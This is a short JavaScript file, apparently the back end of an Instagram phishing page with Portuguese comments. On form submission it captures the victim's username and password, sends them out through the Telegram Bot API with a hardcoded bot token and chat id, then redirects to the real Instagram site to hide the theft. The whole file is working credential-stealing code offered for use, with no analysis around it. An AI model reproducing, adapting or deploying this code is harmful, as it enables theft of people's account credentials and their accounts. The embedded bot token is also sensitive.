const token = '7333858492:AAFNcTINex5X69tZOWi18TTsUPiBBVt81jI';
const chatId = '8129097592';

document.getElementById('phishForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  const message = `Instagram Phish:\nUsuário: ${username}\nSenha: ${password}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  });

  // Redireciona para o Instagram oficial
  setTimeout(() => {
    window.location.href = 'https://www.instagram.com/';
  }, 1000);
});